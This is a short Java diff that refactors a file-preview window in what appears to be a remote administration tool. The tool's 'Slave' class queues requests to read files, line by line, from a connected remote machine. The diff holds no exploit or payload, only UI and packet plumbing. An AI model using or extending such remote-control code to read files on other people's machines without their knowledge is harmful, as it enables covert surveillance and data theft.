@@ -20,8 +20,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet60PreviewFile;
 
 
 @SuppressWarnings("serial")
@@ -31,7 +30,7 @@ public class FramePreviewFile extends BaseFrame {
 	private String file;
 	private int line = 0;
 	private JTextPane textPane;
-	public static HashMap<String, FramePreviewFile> instances = new HashMap<String, FramePreviewFile>();
+	public static final HashMap<String, FramePreviewFile> instances = new HashMap<String, FramePreviewFile>();
 	private JButton btnClearreset;
 
 	public JTextPane getPane() {
@@ -64,8 +63,7 @@ public class FramePreviewFile extends BaseFrame {
 		btnReadMore.setIcon(new ImageIcon(FramePreviewFile.class.getResource("/icons/transfer.png")));
 		btnReadMore.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				PacketBuilder pb = new PacketBuilder(OutgoingHeader.PREVIEW_FILE, new Object[] { file, line++ });
-				sl.addToSendQueue(pb);
+				sl.addToSendQueue(new Packet60PreviewFile(file, line++));
 			}
 		});
 
